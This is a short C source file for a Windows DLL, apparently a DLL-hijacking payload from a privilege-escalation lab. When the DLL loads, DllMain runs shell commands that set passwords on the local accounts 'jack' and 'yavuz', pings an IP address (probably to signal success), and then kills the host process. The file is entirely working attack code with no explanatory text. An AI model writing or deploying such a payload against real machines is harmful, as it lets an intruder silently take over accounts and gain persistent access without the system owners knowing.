#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /k net user jack Password11");
        system("cmd.exe /k net user yavuz aylacik");
        system("cmd.exe /k ping http://10.8.235.86");
        ExitProcess(0);
    }
    return TRUE;
}
